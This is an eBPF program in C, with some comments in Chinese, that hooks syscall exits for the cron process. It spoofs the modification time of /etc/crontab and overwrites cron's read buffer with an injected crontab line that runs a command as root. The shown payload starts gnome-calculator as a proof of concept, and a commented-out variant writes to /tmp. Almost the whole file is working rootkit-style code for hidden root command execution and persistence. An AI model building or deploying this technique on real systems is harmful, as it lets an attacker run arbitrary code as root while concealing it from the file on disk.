// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */

#define BPF_NO_PRESERVE_ACCESS_INDEX
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

struct pidandfd {
	unsigned int pid;
	unsigned int fd;
}; 

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, struct pidandfd);
    __type(value, unsigned int);
} map_fds SEC(".maps");

#define MAX_FILE_NAME_LEN 256
#define INTERESTING_FILENAME "/etc/crontab"
//char PAYLOAD[]="* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/naive \" \n#";
char PAYLOAD[]="* * * * * root  sudo -i -u skysider  \"/bin/bash\" -c \"DISPLAY=:0 gnome-calculator\"& \n#";
static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_exit_close(struct pt_regs *regs,unsigned long ret,unsigned int pid);
static __inline int handle_exit_stat(struct pt_regs *regs, unsigned long ret, unsigned int pid);
static __inline int handle_exit_fstat(struct pt_regs *regs, unsigned long ret, unsigned int pid);


static __inline int memcmp(const void* s1, const void* s2, size_t cnt);

#define TASK_COMM_LEN 16
#define TARGET_NAME "cron"


SEC("raw_tp/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  unsigned int syscall_id=0;
  struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
  unsigned long ret = ctx->args[1];
  unsigned int pid = bpf_get_current_pid_tgid() & 0xffffffff;
  syscall_id = BPF_CORE_READ(regs,orig_ax);
  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));
  //过滤掉不是目标进程的进程
  if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
	return 0;
  bpf_printk("BPF triggered from PID %d, name %s.\n", pid, comm);
  switch (syscall_id)
    {
		case 0:
			handle_exit_read(regs,ret,pid);
			break;
		case 3:
			handle_exit_close(regs,ret,pid);
			break;
		case 4: 
			handle_exit_stat(regs, ret, pid);
			break;
		case 5:
			handle_exit_fstat(regs, ret, pid);
			break;
		case 257:
            handle_exit_openat(regs,ret,pid);
            break;
	}
}

static __inline int handle_exit_stat(struct pt_regs *regs, unsigned long ret, unsigned int pid)
{
	char buf[0x40];
	struct stat *statbuf_ptr;
	__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
	bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM1_CORE(regs)));
	// bpf_printk("exit_stat %s:%d\n",buf,pid);
	if (memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)))
		return 0;
	bpf_printk("exit_stat %s:%d\n",buf,pid);
	statbuf_ptr= PT_REGS_PARM2_CORE(regs);
	bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));

}

static __inline int handle_exit_fstat(struct pt_regs *regs, unsigned long ret, unsigned int pid)
{
	unsigned int fd=PT_REGS_PARM1_CORE(regs);
	struct pidandfd pidfd={.pid=pid, .fd=fd};
	struct stat *statbuf_ptr;
	__kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
	unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
	if(exists==NULL)
		return 0;
	bpf_printk("exit_fstat pid:%d fd:%d\n",pid,fd);
	if(*exists==1)
	{
		bpf_printk("fstat! target fd:%d\n",fd);
		statbuf_ptr= PT_REGS_PARM2_CORE(regs);
		bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));
	}
}

static __inline int handle_exit_openat(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
	
	unsigned int retfd=ret;
	char buf[0x40];
	//读文件名，这里VSCODE会给这一行报错，看来果真还是不够行
	bpf_probe_read_str(buf,sizeof(buf), ((char *)PT_REGS_PARM2_CORE(regs)));
	//bpf_printk("exit_openat %s:%d fd:%d\n",buf,pid,retfd);
	//如果文件名不匹配我们感兴趣的文件名就不做了睡大觉

	if (memcmp(buf, INTERESTING_FILENAME, sizeof(INTERESTING_FILENAME)))
		return 0;
	//是我们感兴趣的文件，存入map_fds
	bpf_printk("exit_openat %s:%d fd:%d\n",buf,pid,retfd);
	struct pidandfd pidfd={.pid=pid, .fd=retfd};
	unsigned int one=1;
	bpf_map_update_elem(&map_fds, &pidfd, &one, BPF_ANY);
}

static __inline int handle_exit_close(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
	unsigned int closedfd=PT_REGS_PARM1_CORE(regs);
	struct pidandfd pidfd={.pid=pid, .fd=closedfd};
	//bpf_printk("exit_close %d:%d\n",pid,closedfd);
	int zero=0;
	bpf_map_update_elem(&map_fds, &pidfd, &zero, BPF_ANY);
	//bpf_map_delete_elem(&map_fds, &pidfd);
}


static __inline int handle_exit_read(struct pt_regs *regs,unsigned long ret,unsigned int pid)
{
	//char* buf[40];
	unsigned int readlen=ret;
	unsigned int fd=PT_REGS_PARM1_CORE(regs);
	struct pidandfd pidfd={.pid=pid, .fd=fd};
	unsigned int* exists=bpf_map_lookup_elem(&map_fds, &pidfd);
	if(exists==NULL)
		return 0;
	bpf_printk("exit_read pid:%d fd:%d\n",pid,fd);
	if(*exists==1)
	{
		bpf_printk("READING! target fd:%d read %d bytes\n",fd,readlen);
		if(readlen>sizeof(PAYLOAD))
		{
			bpf_printk("writing payload\n");
			char* buf=(char *)PT_REGS_PARM2_CORE(regs);
			bpf_probe_write_user((void *)(buf),PAYLOAD, sizeof(PAYLOAD));
		}
		
	}

}

char LICENSE[] SEC("license") = "Dual BSD/GPL";


/* ****************************** Implement Begin ****************************** */

static __inline int memcmp(const void* s1, const void* s2, size_t cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}


/* ****************************** Implement Over ****************************** */
